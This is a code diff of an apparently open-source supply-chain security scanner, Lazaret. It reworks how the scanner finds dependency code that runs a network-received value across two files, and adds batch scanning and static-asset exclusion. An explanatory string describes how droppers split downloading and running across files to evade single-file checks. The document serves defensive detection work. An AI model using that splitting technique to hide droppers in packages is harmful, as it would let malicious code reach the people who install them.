-                out[(mod.key, name)] = (mod, source, refs, None)
-            for cls, meths in mod.classes.items():
-                for meth, ((source, refs), _static) in meths.items():
-                    out[(mod.key, cls + "." + meth)] = (mod, source, refs, cls)
-            for var, (source, refs) in mod.env.items():
-                out[(mod.key, "<env>." + var)] = (mod, source, refs, None)
-            if len(out) >= _XF_MAX_SYMBOLS:
-                break
-        return out
-
-    def tainted(self):
-        """The symbols that hold a received value (see the section comment)."""
-        syms = self.symbols()
-        edges = {}
-        for sym, (mod, _source, refs, cls) in syms.items():
-            found = []
-            for chain in refs:
-                got = self.resolve_chain(mod, chain, cls)
-                if got is not None and got[0] == "sym":
-                    found.append(got[1])
-            edges[sym] = found
-        tainted = {sym for sym, (_m, source, _r, _c) in syms.items() if source}
-        for _ in range(_XF_ROUNDS):
-            grew = {sym for sym, found in edges.items() if sym not in tainted and any(f in tainted for f in found)}
-            if not grew:
-                break
-            tainted |= grew
-        return tainted
-
-    def runners(self):
-        """The functions that run a parameter as code (def execute(c):
-        exec(c)): their body read by the single-file detector with the
-        parameters seeded. At most _XF_MAX_RUNNERS bodies are read."""
-        out, count = set(), 0
-        for mod in self.mods.values():
-            for sym, (params, body) in mod.bodies.items():
-                names = sorted(set(params) - _XF_NOT_PARAMS)
-                if not names:
-                    continue
-                count += 1
-                if count > _XF_MAX_RUNNERS:
-                    return out
-                res = _received_code_kind("\n".join(body), extra_always=names)
-                if res is not None and res[1] == "run":
-                    out.add((mod.key, sym))
-        return out
-
-    def names_of(self, key, depth=0):
-        """The names module `key` exports, for its members (m.pull)."""
-        mod = self.mods.get(key)
-        if mod is None or depth > _XF_MAX_DEPTH:
-            return set()
-        if mod.lang == "py":
-            return set(mod.defs) | set(mod.classes) | {n for n in mod.imports if not n.startswith("*")}
-        out = set(mod.exports) | set(mod.reexports)
-        for star in mod.stars + ([mod.default_module] if mod.default_module else []):
-            out |= self.names_of(star, depth + 1)
-        return out
-
-
-def _xf_instances(text, expr, lang):
-    """Local names — or an instance's own, self.c / this.c — assigned an
-    instance of the class named by `expr` (`v = C(…)`, `this.c = new ns.C(…)`)."""
-    new = r"(?:new[ \t]+)?" if lang == "js" else ""
-    rx = re.compile(r"(?<![\w$.])(?P<var>(?:(?:self|this)[ \t]*\.[ \t]*)?[A-Za-z_$][\w$]*)[ \t]*=[ \t]*" + new
-                    + re.escape(expr) + r"[ \t]*\(")
-    return {_XF_SPACE_RE.sub("", m.group("var")) for m in rx.finditer(text)}
-
-
-def _xf_marked_members(pkg, marked):
-    """{(module key, class): [(member, static)]} of the `marked` members, in
-    the class's order: what _xf_seeds reads of a class, once per package."""
-    out = {}
-    for mod in pkg.mods.values():
-        for cls, meths in mod.classes.items():
-            got = [(meth, static) for meth, (_ret, static) in meths.items() if (mod.key, cls + "." + meth) in marked]
-            if got:
-                out[(mod.key, cls)] = got
-    return out
-
-
-def _xf_seeds(pkg, mod, marked, envs, members=None):
-    """({chain: where it comes from}, [(expr, member, label)]) for module
-    `mod`: the names that name a `marked` symbol in it (see the section
-    comment), and the classes whose member a new instance's call reaches
-    directly (C().pull()). `members`: _xf_marked_members(pkg, marked)."""
-    seeds, direct = {}, []
-    code = mod.text
-    if members is None:
-        members = _xf_marked_members(pkg, marked)
-
-    def add_class(expr, val, label):
-        for meth, static in members.get(val, ()):
-            if static:
-                seeds[expr + "." + meth] = label
-                continue
-            for var in sorted(_xf_instances(code, expr, mod.lang)):
-                seeds[var + "." + meth] = label
-            direct.append((expr, meth, label))
-
-    def add(expr, got, label, depth=0):
-        if got is None or depth > 2:
-            return
-        kind, val = got
-        if kind == "sym":
-            if val in marked:
-                seeds[expr] = label
-        elif kind == "class":
-            add_class(expr, val, label)
-        elif kind == "module":
-            for name in sorted(pkg.names_of(val))[:_XF_MAX_SEEDS * 4]:
-                sub = pkg.export(val, name)
-                if sub is not None and sub[0] != "module":
-                    add(expr + "." + name, sub, label, depth + 1)
-            if val in pkg.mods and pkg.mods[val].lang == "js":      # (a re-export may name a missing module)
-                add(expr, pkg.export(val, "default"), label, depth + 1)
-
-    for local, imp in mod.imports.items():
-        if local.startswith("*"):
-            if imp[0] in pkg.mods:
-                for name in sorted(pkg.names_of(imp[0])):
-                    add(name, pkg.export(imp[0], name), imp[3])
-            continue
-        got = pkg.resolve_import(imp)
-        if got is None and mod.lang == "js" and imp[2] == "default" and imp[0] in pkg.mods:
-            got = ("module", imp[0])                 # a CommonJS module imported by default is its exports
-        add(local, got, imp[3])
-    for var, label in envs.items():
-        if var in code:
-            seeds[("environ." if mod.lang == "py" else "process.env.") + var] = label
-    return seeds, direct
-
-
-def _xf_rewrite(code, direct, lang):
-    """`code` with each call of a method on a new instance (`C().pull`,
-    `new ns.C(x).pull`) read as one seeded name, padded to its length;
-    returns (code, {name: label})."""
-    names = {}
-    for n, (expr, meth, label) in enumerate(direct[:_XF_MAX_SEEDS]):
-        new = r"(?:new[ \t]+)?" if lang == "js" else ""
-        rx = re.compile(r"(?<![\w$.])" + new + re.escape(expr) + r"[ \t]*\([^()\n]{0,200}\)[ \t]*\.[ \t]*"
-                        + re.escape(meth) + r"(?![\w$])")
-        name = f"_xf{n}"
-        code, count = rx.subn(lambda m: name.ljust(len(m.group())), code)
-        if count:
-            names[name] = label
-    return code, names
-
-
-_XF_WHY = (
-    "A dropper can split what it downloads and the code that runs it across two files of a "
-    "package, so neither file shows the shape alone: one fetches, the other runs what the "
-    "first returns. Running code a server sends is the shape no library needs — whoever "
-    "controls the server chooses what runs.")
-
-
-def _xf_issue(path, line, text, cat, srcs, who="Dependency code", runner=False):
-    """The follower's SC-IMPORT-RISK finding; `who` starts the message ("Dependency
-    code"; a registry scan names the file). `runner`: the value is received
-    here and run by a function of another file."""
-    lines = text.split("\n")
-    where = ", ".join(srcs)
-    tail = (f"the function that runs it is in another file of the package ({where})" if runner
-            else f"the value is received in another file of the package ({where})")
-    return mk_issue(
-        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT",
-         "sev": import_time_severity([_DL_CATEGORY_REASON[cat]]),
-         "msg": f"{who} {_DL_CATEGORY_REASON[cat]}; {tail}.", "why": _XF_WHY,
-         "fix": (f"Read both files: what does this file receive, and what does {where} run?" if runner
-                 else f"Read both files: what does {where} receive, and what runs it here?"),
-         "ref": "CWE-506 · Supply chain"}, path, line, lines, redactor=_Redactor(lines))
-
-
-def _xf_py_module(path):
-    """(top package, dotted module, is_package) for a dependency .py file under
-    site-packages / dist-packages / vendor, else None. __init__.py is its own
-    package; another file is <pkg>…<stem>."""
-    parts = path.replace(os.sep, "/").split("/")
-    idx = max((len(parts) - 1 - parts[::-1].index(m) for m in _XF_DEP_MARKERS if m in parts), default=-1)
-    rel = parts[idx + 1:] if 0 <= idx < len(parts) - 1 else []
-    if not rel or not rel[-1].endswith(".py"):
-        return None
-    stem = rel[-1][:-3]
-    is_pkg = stem == "__init__"
-    mod_parts = rel[:-1] if is_pkg else rel[:-1] + [stem]
-    if not mod_parts:
-        return None
-    return rel[0], ".".join(mod_parts), is_pkg
-
-
-def _xf_resolve(mod_spec, pkg_parts):
-    """Resolve an import's module spec (absolute 'a.b', or relative '.a' / '..a')
-    against the importing module's package parts, to a dotted module or None."""
-    dots = len(mod_spec) - len(mod_spec.lstrip("."))
-    rest = mod_spec[dots:]
-    if dots == 0:
-        return rest or None
-    keep = len(pkg_parts) - (dots - 1)
-    if keep < 0:
-        return None
-    target = pkg_parts[:keep] + (rest.split(".") if rest else [])
-    return ".".join(target) or None
 
 
 def _xf_js_package(path):
@@ -12003,96 +6224,77 @@ def _xf_js_package(path):
     return None
 
 
-def _xf_js_norm(rel):
-    """A package-relative JS path as a module key: extension dropped, /index dropped."""
-    for ext in (".js", ".cjs", ".mjs", ".jsx", ".json"):
-        if rel.endswith(ext):
-            rel = rel[:-len(ext)]
-            break
-    return rel[:-6] if rel.endswith("/index") else rel
+# (the detection round) The top-level modules and packages one distribution
+# installs into site-packages are one package to the follower in a --deps
+# scan too, as a registry scan reads a release (one_package): the
+# distribution's .dist-info/RECORD lists them (_xf_site_groups). Top-level
+# names no RECORD lists together stay packages of their own (two
+# distributions). At most _XF_RECORD_BYTES of a RECORD are read.
+_XF_RECORD_BYTES = 4 << 20
+_XF_SITE_MARKERS = ("site-packages", "dist-packages")
 
 
-def _xf_package_issues(mods, skip, who):
-    """The follower's findings for one package's modules (see the section comment)."""
-    pkg = _XfPackage(mods)
-    tainted = pkg.tainted()
-    runners = pkg.runners()
-    if not tainted and not runners:
-        return []
-    envs = {}
-    for key, name in sorted(tainted):
-        if name.startswith("<env>."):
-            envs.setdefault(name[len("<env>."):], key)
-    held, running = _xf_marked_members(pkg, tainted), _xf_marked_members(pkg, runners)
-    out = []
-    for mod in mods.values():
-        if mod.path.replace(os.sep, "/") in skip:
+def _xf_site_groups(root, files):
+    """{'/'-separated path: group} for the dependency Python files under a
+    site-packages or dist-packages directory of the scan root `root` whose
+    top-level module or package a distribution's RECORD lists with another
+    (see above): the group is that directory and the first such
+    .dist-info's name, by name."""
+    sites = {}                                      # site dir -> {top-level name: [paths]}
+    for f in files:
+        if not f.get("dep") or f["lang"] != "py":
             continue
-        seeds, direct = _xf_seeds(pkg, mod, tainted, envs, held) if tainted else ({}, [])
-        run_seeds = _xf_seeds(pkg, mod, runners, {}, running)[0] if runners else {}
-        if not seeds and not direct and not run_seeds:
+        path = f["path"].replace(os.sep, "/")
+        parts = path.split("/")
+        idx = max((len(parts) - 1 - parts[::-1].index(m) for m in _XF_DEP_MARKERS if m in parts), default=-1)
+        if idx < 0 or idx >= len(parts) - 1 or parts[idx] not in _XF_SITE_MARKERS:
             continue
-        code = _import_code(mod.text, mod.lang)
-        if _received_code_kind(code) is not None:
-            continue                                    # the file shows it alone: the single-file test's
-        code, more = _xf_rewrite(code, direct, mod.lang)
-        seeds.update(more)
-        names = sorted(seeds)[:_XF_MAX_SEEDS]
-        who_ = who(mod.path) if callable(who) else who
-        res = _received_code_kind(code, extra_always=names) if names else None
-        if res is not None:
-            out.append(_xf_issue(mod.path, res[0], mod.text, res[1], sorted({seeds[n] for n in names}), who_))
+        sites.setdefault("/".join(parts[:idx + 1]), {}).setdefault(parts[idx + 1], []).append(path)
+    out = {}
+    for site, tops in sites.items():
+        if len(tops) < 2:
             continue
-        if run_seeds:
-            run_names = sorted(run_seeds)[:_XF_MAX_SEEDS]
-            res = _received_code_kind(code, extra_always=names, extra_runners=run_names)
-            if res is not None and res[1] == "run":
-                out.append(_xf_issue(mod.path, res[0], mod.text, "run", sorted({run_seeds[n] for n in run_names}),
-                                     who_, runner=True))
+        where = os.path.join(root, *site.split("/"))
+        try:
+            names = sorted(n for n in os.listdir(where) if n.endswith(".dist-info"))
+        except OSError:
+            continue
+        label = {}                                  # top-level name -> its group's .dist-info
+        for name in names:
+            try:                                    # (a real directory: no link is followed)
+                st = os.lstat(os.path.join(where, name))
+            except OSError:
+                continue
+            if not _stat.S_ISDIR(st.st_mode) or _is_reparse_point(st):
+                continue
+            listed = sorted({t for t in _xf_record_tops(os.path.join(where, name, "RECORD")) if t in tops})
+            if len(listed) < 2:
+                continue
+            joined = {name} | {label[t] for t in listed if t in label}
+            first = min(joined)
+            for t in [t for t, g in label.items() if g in joined] + listed:
+                label[t] = first
+        for top, group in label.items():
+            for path in tops[top]:
+                out[path] = site + "/" + group
     return out
 
 
-def _cross_file_received_issues(files, skip_paths=(), who="Dependency code", one_package=False):
-    """SC-IMPORT-RISK for each dependency file that runs a value received over
-    the network in another file of the same package, or receives one and
-    hands it to another file's function that runs it (see the section
-    comment), in Python and in npm packages. Skips the files in `skip_paths`
-    (those already flagged single-file). `who(path)` may name the file in the
-    message. A registry scan reads one distribution: `one_package` groups all
-    its Python modules as one package (its top-level packages and modules
-    import each other). Best-effort: a package that raises is skipped."""
-    skip = set(skip_paths)
-    groups = {}
-    for f in files:
-        if not f.get("dep"):
-            continue
-        if f["lang"] == "py":
-            info = _xf_py_module(f["path"])
-            if info is not None:
-                groups.setdefault(("py", "" if one_package else info[0]), []).append((info[1], info[2], f))
-        elif f["lang"] == "js":
-            root = _xf_js_package(f["path"])
-            if root is not None:
-                rel = f["path"].replace(os.sep, "/")[len(root) + 1:]
-                groups.setdefault(("js", root), []).append((_xf_js_norm(rel), rel, f))
-    out = []
-    for (lang, _root), members in groups.items():
-        if not 2 <= len(members) <= _XF_MAX_FILES:      # needs >= 2; a huge package is skipped
-            continue
-        if not any(any(n in f["content"] for n in _DL_NEEDLES) for _k, _x, f in members):
-            continue                                    # no network source anywhere: nothing is received
-        try:
-            mods = {}
-            for key, extra, f in members:
-                mod = _XfModule(key, lang, f["path"], f["content"])
-                if lang == "py":
-                    _xf_py_parse(mod, key.split(".") if extra else key.split(".")[:-1])
-                else:
-                    _xf_js_parse(mod, extra)
-                mods[key] = mod
-            out.extend(_xf_package_issues(mods, skip, who))
-        except Exception:                               # one package must never kill the scan
-            continue
+def _xf_record_tops(path):
+    """The top-level names a RECORD lists (its rows' first path parts), none
+    when it cannot be read as one (not a regular file, too large, not text)."""
+    try:
+        data = _read_prefix(path, _XF_RECORD_BYTES + 1)
+    except (OSError, ValueError):
+        return set()
+    if len(data) > _XF_RECORD_BYTES:
+        return set()
+    out = set()
+    for row in data.decode("utf-8", "replace").split("\n"):
+        entry = row.split(",", 1)[0].strip().strip('"').replace("\\", "/")
+        top = entry.split("/", 1)[0]
+        if top and top not in (".", "..") and ":" not in top:
+            out.add(top)
     return out
 
 
@@ -12118,42 +6320,119 @@ def dependency_checks(root, files, manifests, issues, excludes=(), should_stop=N
         try:
             _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end)
         except Exception as exc:            # one manifest must never kill the run
-            out.append(scan_error_issue(issue["file"], exc))
-    # the import-time test for each dependency file, a batch at a time: the
-    # native engine reads a batch on threads (engine.py); the Python engine
-    # one file at a time, as it always has
-    from lazaret.scanner import engine
+            out.append(engine.error_issue(issue["file"], exc))
+    # the import-time test for each dependency file, a batch at a time (the
+    # engine reads a batch on threads); a file it could not answer about is
+    # SC-TRUNCATED (engine.error_issue)
+    assets = _deps_web_assets(tree, files)
     todo = [f for f in files
-            if f.get("dep") and f["lang"] in ("js", "py") and f["path"].replace(os.sep, "/") not in run]
-    size = engine.BATCH if engine.name() == "rust" else 1
-    for start in range(0, len(todo), size):
+            if f.get("dep") and f["lang"] in ("js", "py") and f["path"].replace(os.sep, "/") not in run
+            and f["path"].replace(os.sep, "/") not in assets]
+    for start in range(0, len(todo), engine.BATCH):
         if should_stop is not None:
             stopped = should_stop()
             if stopped:
                 return out, extra, stopped
-        chunk = todo[start:start + size]
+        chunk = todo[start:start + engine.BATCH]
         try:
             risks = engine.import_time_risks([(f["content"], f["lang"]) for f in chunk])
         except Exception:                   # each file is then read on its own below
             risks = [None] * len(chunk)
         for f, risk in zip(chunk, risks):
             try:
+                if engine.unanswered(risk):
+                    raise risk
                 found = dependency_import_issue(f["path"], f["content"], f["lang"], risk=risk)
                 agent = dependency_agent_issue(f["path"], f["content"])
             except Exception as exc:
-                found, agent = scan_error_issue(f["path"], exc), None
+                found, agent = engine.error_issue(f["path"], exc), None
             if found is not None:
                 out.append(found)
             if agent is not None:
                 out.append(agent)
-    # Cross-file received code (both engines since 0.1.8): a value received in one
-    # file of a package and run in another. Reached only when the checks above did
-    # not stop (each returns early on should_stop), so no extra should_stop call
-    # here — it is a bounded pass. Skips the files already flagged CRITICAL
-    # single-file (a MAJOR one can still be found running what another file received).
+    # Cross-file received code (0.1.8): a value received in one file of a
+    # package and run in another, by the native engine's follower (it reads
+    # the packages on threads: engine.cross_file_issues). Reached
+    # only when the checks above did not stop (each returns early on
+    # should_stop), so no extra should_stop call here — it is a bounded pass.
+    # Skips the files already flagged CRITICAL single-file (a MAJOR one can
+    # still be found running what another file received).
     flagged = {i["file"].replace(os.sep, "/") for i in out if i["rule"] == "SC-IMPORT-RISK" and i["sev"] == "CRITICAL"}
-    out.extend(_cross_file_received_issues(files, flagged))
+    code = [f for f in files if f["path"].replace(os.sep, "/") not in assets] if assets else files
+    out.extend(engine.cross_file_issues(code, flagged, site_groups=_xf_site_groups(tree.root, code)))
     return out, extra, None
+
+
+def _deps_web_assets(tree, files):
+    """The '/'-separated paths of the dependency JavaScript files that are a
+    web app's static assets (see the section comment): in a _next, static
+    or public directory of their package, and reached from none of its npm
+    package's entry points."""
+    found = {}                              # npm package root (None: not npm's) -> [paths]
+    for f in files:
+        if not f.get("dep") or f["lang"] != "js":
+            continue
+        path = f["path"].replace(os.sep, "/")
+        root = _xf_js_package(path)
+        rel = path[len(root) + 1:] if root is not None else path
+        if any(part.lower() in _DEPS_WEB_DIRS for part in rel.split("/")[:-1]):
+            found.setdefault(root, []).append(path)
+    out = set()
+    for root, paths in found.items():
+        reached = _deps_npm_reach(tree, root) if root is not None else set()
+        out.update(p for p in paths if p not in reached)
+    return out
+
+
+def _deps_npm_entries(data):
+    """The paths an npm package.json's main, module, bin and exports name."""
+    out = []
+    for key in ("main", "module"):
+        if isinstance(data.get(key), str):
+            out.append(data[key])
+    b = data.get("bin")
+    out.extend([b] if isinstance(b, str) else [v for v in b.values() if isinstance(v, str)] if isinstance(b, dict) else [])
+    stack = [data.get("exports")]
+    while stack and len(out) < _DEPS_REACH_MAX:
+        e = stack.pop()
+        if isinstance(e, str):
+            if "*" not in e:
+                out.append(e)
+        elif isinstance(e, dict):
+            stack.extend(reversed(list(e.values())))
+        elif isinstance(e, list):
+            stack.extend(reversed(e))
+    return out
+
+
+def _deps_npm_reach(tree, root):
+    """The files of the npm package at `root` its entry points reach: what
+    Node runs for the package itself and for each entry point, then the
+    local files they require or import and the scripts they start with
+    node (spawned_scripts), transitively (at most _DEPS_REACH_MAX)."""
+    manifest = tree.manifests.get(root + "/package.json")
+    data = None
+    if manifest is not None:
+        data, _problems = load_manifest(manifest["path"], manifest["content"])
+    entries = _deps_npm_entries(data) if isinstance(data, dict) else []
+    queue = [tree.resolve(root)] + [tree.resolve(t) for t in (_tree_join(root, e) for e in entries) if t is not None]
+    seen = set()
+    while queue and len(seen) < _DEPS_REACH_MAX:
+        rel = queue.pop()
+        if rel is None or rel in seen or not rel.startswith(root + "/"):
+            continue
+        seen.add(rel)
+        f = tree.sources.get(rel)
+        if f is None or f.get("lang") != "js":
+            continue
+        base = posixpath.dirname(rel)
+        targets = [(base, t) for _q, t in _DEPS_LOCAL_DEP_RE.findall(f["content"])]
+        targets += [(base if where == "dir" else root, t) for where, t in spawned_scripts(f["content"], "js")]
+        for at, target in targets:
+            joined = _tree_join(at, target)
+            if joined is not None:
+                queue.append(tree.resolve(joined))
+    return seen
 
 
 def _is_package_root(directory):
@@ -12193,7 +6472,6 @@ def _implicit_gyp_hooks(tree, manifests):
 
 
 def _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end):
-    from lazaret.scanner import engine     # (imported here: engine imports core)
     manifest = issue["file"]
     base = posixpath.dirname(manifest.replace(os.sep, "/"))
     direct = agent_hijack_in_command(issue["cmd"])         # the hook runs the agent itself
@@ -12221,7 +6499,7 @@ def _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end):
         if rel is None:
             continue
         text = _dependency_script_text(tree, rel, "sh" if rel.endswith(".sh") else "js", out, extra, run)
-        reasons = engine.install_script_risk(text) if text else []
+        reasons = engine.install_script_risk(text, lang=engine.script_lang(rel)) if text else []
         if reasons and issue["sev"] not in ("BLOCKER", "CRITICAL"):
             msg = f"Install hook runs {target}, which {'; and '.join(reasons)}."
             issue["sev"] = "CRITICAL"
@@ -12231,7 +6509,7 @@ def _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end):
             out.append(agent)
         # the scripts it starts with node or python (0.1.8, spawned_scripts)
         for started, stext in _started_dependency_scripts(tree, rel, text, base, out, extra, run):
-            more = engine.install_script_risk(stext) if stext else []
+            more = engine.install_script_risk(stext, lang=engine.script_lang(started)) if stext else []
             if more and issue["sev"] not in ("BLOCKER", "CRITICAL"):
                 shown = started[len(base) + 1:] if base and started.startswith(base + "/") else started
                 msg = f"Install hook runs {target}, which starts {shown}, which {'; and '.join(more)}."
@@ -12249,7 +6527,7 @@ def _started_dependency_scripts(tree, rel, text, cwd, out, extra, run):
         cur, cur_text, depth = queue.pop(0)
         if not cur_text or depth >= _SPAWN_MAX_DEPTH:
             continue
-        for where, path in spawned_scripts(cur_text):
+        for where, path in engine.spawned_scripts(cur_text, engine.script_lang(cur)):
             joined = _tree_join(posixpath.dirname(cur) if where == "dir" else cwd, path)
             nxt = tree.resolve(joined) if joined is not None else None
             if nxt is None or nxt in seen or len(seen) > _SPAWN_MAX_FILES:
@@ -12297,7 +6575,7 @@ def _read_dependency_script(tree, rel, as_lang, out, extra):
         return normalize_newlines(data.decode("utf-8", "replace"))
     text, decode_issues = decode_member(disp, data, lang="js")
     out.extend(decode_issues)
-    out.extend(scan_file(disp, text, "js", dep=True))
+    out.extend(engine.scan_file(disp, text, "js", dep=True))
     extra.append({"path": disp, "content": text, "lang": "js", "dep": True})
     return text
 
@@ -12432,17 +6710,33 @@ def scan_project(root, exclude=(), include_deps=False, taint_config=None,
         issues = list(extra_issues) + list(col["issues"])
         numbered = []       # findings numbered by their file's scan lines (redact_file_issues)
         scanned, stopped = [], None
-        for f in files:
+        # Files a batch at a time (the engine reads a batch on threads:
+        # engine.py; a project file's rules part there, the rest of its scan
+        # in core); should_stop is checked before each batch.
+        batch = engine.BATCH
+        k = 0
+        while k < len(files):
             stopped = should_stop() if should_stop is not None else None
             if stopped:
                 break
+            chunk = [files[k]]
+            while (len(chunk) < batch and k + len(chunk) < len(files)
+                   and files[k + len(chunk)].get("dep", False) == chunk[0].get("dep", False)):
+                chunk.append(files[k + len(chunk)])
             try:
-                found = scan_file(f["path"], f["content"], f["lang"], dep=f.get("dep", False))
-                issues.extend(found)
-                numbered.extend(found)
-            except Exception as exc:        # one file must never kill the run
-                issues.append(scan_error_issue(f["path"], exc))
-            scanned.append(f)
+                results = engine.scan_files([(f["path"], f["content"], f["lang"], f.get("dep", False)) for f in chunk])
+            except Exception:                   # a file core could not scan: each again, on its own
+                results = None
+            for n, f in enumerate(chunk):
+                try:
+                    found = (results[n] if results is not None
+                             else scan_file(f["path"], f["content"], f["lang"], dep=f.get("dep", False)))
+                    issues.extend(found)
+                    numbered.extend(found)
+                except Exception as exc:        # one file must never kill the run
+                    issues.append(engine.error_issue(f["path"], exc))
+                scanned.append(f)
+            k += len(chunk)
         checked = 0                         # config and data files: credentials only
         read = tree_reader(files, configs)  # what an editor's or agent's settings run (SC-AUTORUN)
         for cf in configs:
@@ -12453,7 +6747,7 @@ def scan_project(root, exclude=(), include_deps=False, taint_config=None,
             try:
                 issues.extend(scan_config_file(cf["path"], cf["content"], read))
             except Exception as exc:
-                issues.append(scan_error_issue(cf["path"], exc))
+                issues.append(engine.error_issue(cf["path"], exc))
             checked += 1
         for mf in manifests:
             if not stopped and should_stop is not None:
@@ -12463,7 +6757,7 @@ def scan_project(root, exclude=(), include_deps=False, taint_config=None,
             try:
                 issues.extend(_scan_manifest_entry(mf))
             except Exception as exc:
-                issues.append(scan_error_issue(mf["path"], exc))
+                issues.append(engine.error_issue(mf["path"], exc))
         if not stopped:
             # --deps: what the dependencies run (install hooks, import-time code)
             found, extra, dep_stopped = dependency_checks(root, files, manifests, issues, exclude, should_stop)
@@ -12509,6 +6803,7 @@ def scan_project(root, exclude=(), include_deps=False, taint_config=None,
         return res
     finally:
         REDACT_SECRETS = saved_redact
+
 
 # ---------------- Metrics / ratings ----------------
 def compute_metrics(all_files):
@@ -12612,6 +6907,7 @@ def build_result(root, files, issues):
             "metrics": metrics, "counts": counts, "ratings": ratings,
             "supplyChain": supply, "crossFile": cross_file,
             "perFile": per_file, "issues": issues}
+
 
 # ---------------- Terminal output ----------------
 def c(code, s):
@@ -12875,6 +7171,7 @@ def print_report(res, quiet):
                 print(" " * len(prefix) + c('2', '» ' + ex))   # aligned under the message
         print()
 
+
 # ---------------- HTML report ----------------
 def esc(s):
     return html_mod.escape(str(s), quote=True)
@@ -12980,6 +7277,7 @@ def html_report(res):
 <footer>Generated by Lazaret CLI. Pattern- and heuristic-based static analysis — not a substitute for a full security audit.</footer>
 </body></html>"""
 
+
 # ---------------- SARIF output ----------------
 SARIF_LEVEL = {"BLOCKER": "error", "CRITICAL": "error", "MAJOR": "warning",
                "MINOR": "note", "INFO": "note"}
@@ -13062,6 +7360,7 @@ def sarif_report(res, root=None):
                       "originalUriBaseIds": {SARIF_SRCROOT: {
                           "uri": _root_uri(res["project"] if root is None else root)}},
                       "results": results}]}
+
 
 # ---------------- Baseline (new-code focus) ----------------
 def fingerprint(issue):
@@ -13176,6 +7475,7 @@ def apply_baseline(res, baseline_path, scan_root=None):
         i["new"] = fingerprint(i) not in known
         new_count += i["new"]
     res["newIssues"] = new_count
+
 
 # ---------------- Main ----------------
 # Exit codes (FIX-SPEC 10): 0 scan ok (or the gate failed without --ci);
@@ -13310,7 +7610,6 @@ def _positive_int(text):
 def _main(argv=None):
     global REDACT_SECRETS, EXCERPT_WIDTH, SOURCE_SIZE_CAP
     ap = argparse.ArgumentParser(prog="lazaret", description="Lazaret — security & quality scanner for Python/JS projects.")
-    from lazaret.scanner import engine     # (imported here: engine imports core)
     ap.add_argument("--version", action="version",
                     version=f"lazaret {_lazaret_pkg.__version__} (engine: {engine.describe()})")
     ap.add_argument("directory", help="Project directory to scan")
@@ -13364,14 +7663,10 @@ def _main(argv=None):
                     help=f"Largest source file or manifest read (default {SOURCE_SIZE_CAP:,}, env "
                          f"LAZARET_MAX_SOURCE_BYTES); a larger one is not scanned and gets "
                          f"SC-TRUNCATED, which fails the gate")
-    ap.add_argument("--engine", choices=engine.ENGINES, default=None,
-                    help="The engine that runs the supply-chain tests: rust (the native engine, the default "
-                         "where it is installed) or python (the reference engine; env LAZARET_ENGINE). Both "
-                         "give the same findings.")
     ap.add_argument("-q", "--quiet", action="store_true")
     args = ap.parse_args(argv)
     try:
-        engine.choose(args.engine)
+        engine.require()
     except engine.EngineError as exc:
         print(f"error: {exc}", file=sys.stderr)
         sys.exit(EXIT_USAGE)
